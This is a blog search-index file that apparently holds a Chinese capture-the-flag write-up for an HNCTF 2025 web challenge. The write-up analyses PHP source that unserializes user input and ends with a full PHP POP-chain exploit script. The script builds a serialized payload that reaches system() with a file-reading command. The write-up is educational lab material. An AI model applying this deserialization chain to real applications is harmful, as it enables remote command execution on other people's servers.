<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2025HNCTFweb题目复现</title>
    <link href="/2025/06/15/2025HNCTFweb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/06/15/2025HNCTFweb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p> 记录一次 HNCTF 的 Web 题目复现</p><span id="more"></span><h1 id="一-访问端口，看到源码"><a href="#一-访问端口，看到源码" class="headerlink" title="一.访问端口，看到源码"></a>一.访问端口，看到源码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GOGOGO</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dengchao</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Go Go Go~ 出发喽！&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;dengchao;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DouBao</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dao</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Dagongren</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Bagongren</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;Dagongren != <span class="hljs-variable language_">$this</span>-&gt;Bagongren) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;Dagongren) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;Bagongren)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;Dagongren)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;Bagongren)) )&#123;<br>            <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;dao, [<span class="hljs-string">&#x27;诗人我吃！&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeiCaFei</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$HongCaFei</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;HongCaFei, [<span class="hljs-number">0</span> =&gt; <span class="hljs-variable">$name</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;What do you want to do?&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="二-分析代码"><a href="#二-分析代码" class="headerlink" title="二.分析代码"></a>二.分析代码</h1><p>1）有一个类<strong>GOGOGO</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GOGOGO</span> </span>&#123;<br>    public <span class="hljs-variable">$dengchao</span>;<br>    function __destruct()&#123;<br>        echo <span class="hljs-string">&quot;Go Go Go~ 出发喽！&quot;</span> . <span class="hljs-variable">$this</span>-&gt;dengchao;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>有一个成员变量 <code>$dengchao</code>。</li><li>当对象销毁时（比如脚本结束时），触发 <code>__destruct()</code>，输出一段字符串加上 <code>$dengchao</code> 的值。</li></ul><p>2）一个类<strong>DoubBao</strong></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DouBao</span> &#123;<br>    <span class="hljs-keyword">public</span> $dao;<br>    <span class="hljs-keyword">public</span> $Dagongren;<br>    <span class="hljs-keyword">public</span> $Bagongren;<br><br>    function __toString()&#123;<br>        <span class="hljs-keyword">if</span> (<br>            ($<span class="hljs-keyword">this</span>-&gt;Dagongren != $<span class="hljs-keyword">this</span>-&gt;Bagongren) &amp;&amp;<br>            (md5($<span class="hljs-keyword">this</span>-&gt;Dagongren) === md5($<span class="hljs-keyword">this</span>-&gt;Bagongren)) &amp;&amp;<br>            (sha1($<span class="hljs-keyword">this</span>-&gt;Dagongren) === sha1($<span class="hljs-keyword">this</span>-&gt;Bagongren))<br>        ) &#123;<br>            call_user_func_array($<span class="hljs-keyword">this</span>-&gt;dao, [<span class="hljs-string">&#x27;诗人我吃！&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>有__toString()这个魔术方法，意味着只要该对象被转化成字符串的时候,就会自动触发这个方法</p></li><li><p>条件判断：</p><ul><li><code>Dagongren != Bagongren</code>：值不同。</li><li><code>md5(Dagongren) == md5(Bagongren)</code>。</li><li><code>sha1(Dagongren) == sha1(Bagongren)</code>。</li></ul></li><li><p>找一组 <strong>哈希碰撞值</strong>，即两个不同的值，它们的 <code>md5</code> 和 <code>sha1</code> 哈希值相同。</p></li><li><p>满足条件后，通过 <code>call_user_func_array</code> 调用 <code>$dao</code> 指定的回调函数。</p></li></ul><p>3)类 <strong>HeiCaFei</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeiCaFei</span> </span>&#123;<br>    public <span class="hljs-variable">$HongCaFei</span>;<br>    function __call(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span>)&#123;<br>        call_user_func_array(<span class="hljs-variable">$this</span>-&gt;HongCaFei, [<span class="hljs-string">0 =&gt;</span> <span class="hljs-variable">$name</span>]);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>定义了 <code>__call()</code> 方法：如果调用一个<strong>不存在的方法名</strong>时，会触发该方法。</li><li>然后通过 <code>$HongCaFei</code> 调用任意函数或对象方法。</li></ul><p>4）逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;What do you want to do?&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>如果传入了 <code>POST[&#39;data&#39;]</code>，就对其进行 <code>unserialize()</code>。</p><p>否则展示当前源码。</p><h1 id="三-漏洞分析"><a href="#三-漏洞分析" class="headerlink" title="三.漏洞分析"></a>三.漏洞分析</h1><p><code>unserialize($_POST[&#39;data&#39;])</code> 直接反序列化用户输入，<strong>没有任何过滤</strong></p><h1 id="四-绕过"><a href="#四-绕过" class="headerlink" title="四.绕过"></a>四.绕过</h1><ul><li>利用 <code>==</code> 与 <code>===</code> 对象比较的差异性绕过</li></ul><p>关键：用两个 <code>Error</code> 对象作为 <code>$Dagongren</code> 和 <code>$Bagongren</code></p><ul><li>用<code>Error</code> 实现了 <code>__toString()</code>，但 <code>!=</code> 时不会走 <code>__toString()</code>，而 hash 运算会用 <code>Error-&gt;__toString()</code> 结果</li></ul><h4 id="1）-知识点："><a href="#1）-知识点：" class="headerlink" title="1） 知识点："></a>1） 知识点：</h4><ul><li><p>PHP <code>unserialize()</code> 会还原对象，并自动调用相关魔术方法。</p></li><li><p>如果传入的数据来自用户输入，攻击者就可以控制对象属性和行为。</p></li><li><h3 id="魔术方法触发点"><a href="#魔术方法触发点" class="headerlink" title="魔术方法触发点"></a><strong>魔术方法触发点</strong></h3><h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><ul><li>对象销毁时自动触发。</li><li><code>echo $this-&gt;dengchao</code> → 会调用 <code>$dengchao</code> 对象的 <code>__toString()</code>。</li></ul><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><ul><li>字符串环境中调用对象时会触发 </li><li>内部调用了 <code>call_user_func_array($this-&gt;dao, ...)</code></li></ul><h4 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h4><ul><li>当调用一个<strong>未定义的方法</strong>时会自动触发。</li><li>可控 <code>$HongCaFei</code> 属性 → 最终调用 <code>system(...)</code></li></ul></li></ul><h4 id="2）思路："><a href="#2）思路：" class="headerlink" title="2）思路："></a>2）思路：</h4><p>目的：</p><ul><li>构造一个“对象调用链”，在自动触发魔术方法的过程中执行攻击代码。</li></ul><h4 id="链条："><a href="#链条：" class="headerlink" title="链条："></a>链条：</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__destruct</span>() → <span class="hljs-built_in">__toString</span>() → <span class="hljs-built_in">__call</span>() → <span class="hljs-built_in">system</span>()<br></code></pre></td></tr></table></figure><h4 id="3）条件绕过逻辑："><a href="#3）条件绕过逻辑：" class="headerlink" title="3）条件绕过逻辑："></a>3）条件绕过逻辑：</h4><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">if</span> <span class="hljs-params">(<span class="hljs-string">$a</span> != <span class="hljs-string">$b</span> &amp;&amp; md5(<span class="hljs-string">$a</span>) === md5(<span class="hljs-string">$b</span>) &amp;&amp; sha1(<span class="hljs-string">$a</span>) === sha1(<span class="hljs-string">$b</span>))</span></span><br></code></pre></td></tr></table></figure><ul><li>使用两个不同的对象：<ul><li><code>Error(&quot;payload&quot;, 1)</code> ≠ <code>Error(&quot;payload&quot;, 2)</code>（对象不同，<code>!=</code> 成立）</li><li><code>md5($obj)</code> 实际上是 <code>md5((string)$obj)</code> → 都是 <code>&quot;payload&quot;</code> → 成立</li><li><code>sha1($obj)</code> 同理</li></ul></li></ul><h4 id="4-payload执行过程"><a href="#4-payload执行过程" class="headerlink" title="4)payload执行过程"></a>4)payload执行过程</h4><ol><li>传入payload</li><li><code>unserialize($payload)</code> → 创建多个对象并初始化属性</li><li>某对象被销毁（GC或脚本结束） → 自动执行 <code>__destruct()</code></li><li><code>__destruct()</code> 中 <code>echo $this-&gt;dengchao</code> → 触发 <code>__toString()</code></li><li><code>__toString()</code> 中构造的判断通过（hash 碰撞） → 执行 <code>call_user_func_array()</code></li><li>调用 <code>[HeiCaFei实例, &quot;test&quot;]</code> → 由于 <code>test()</code> 未定义 → 触发 <code>__call()</code></li><li><code>__call()</code> 中构造的 <code>call_user_func_array(&quot;system&quot;, [&quot;命令&quot;])</code> 执行</li></ol><h1 id="五-pop链"><a href="#五-pop链" class="headerlink" title="五.pop链"></a>五.pop链</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GOGOGO</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$dengchao</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Go Go Go~ 出发喽！&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;dengchao;<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DouBao</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$dao</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$Dagongren</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$Bagongren</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;Dagongren != <span class="hljs-variable language_">$this</span>-&gt;Bagongren) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;Dagongren)<br>=== <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;Bagongren)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;Dagongren)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-<br>&gt;Bagongren)) )&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;dao, [<span class="hljs-string">&#x27;诗⼈我吃！&#x27;</span>]);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeiCaFei</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$HongCaFei</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;HongCaFei, [<span class="hljs-number">0</span> =&gt; <span class="hljs-variable">$name</span>]);<br>&#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">GOGOGO</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DouBao</span>();<br><span class="hljs-variable">$test1</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>, <span class="hljs-number">1</span>);<span class="hljs-variable">$test2</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>, <span class="hljs-number">2</span>);<br><span class="hljs-variable">$c1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HeiCaFei</span>();<br><span class="hljs-variable">$c2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HeiCaFei</span>();<br><span class="hljs-variable">$c2</span>-&gt;HongCaFei = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$c1</span>-&gt;HongCaFei = [<span class="hljs-variable">$c2</span>, <span class="hljs-string">&quot;cat\$&#123;IFS&#125;/of*&quot;</span>];<br><span class="hljs-variable">$b</span>-&gt;dao = [<span class="hljs-variable">$c1</span>, <span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-variable">$b</span>-&gt;Dagongren = <span class="hljs-variable">$test1</span>;<br><span class="hljs-variable">$b</span>-&gt;Bagongren = <span class="hljs-variable">$test2</span>;<br><span class="hljs-variable">$a</span>-&gt;dengchao = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$pop</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;i%3A1%3Bi%3A0%3B%7D&quot;</span>, <span class="hljs-string">&quot;i%3A1%3Bi%3A0%3B&quot;</span>,<br><span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>)));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>未完待续</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/05/20/Hello-World-0/"/>
    <url>/2025/05/20/Hello-World-0/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
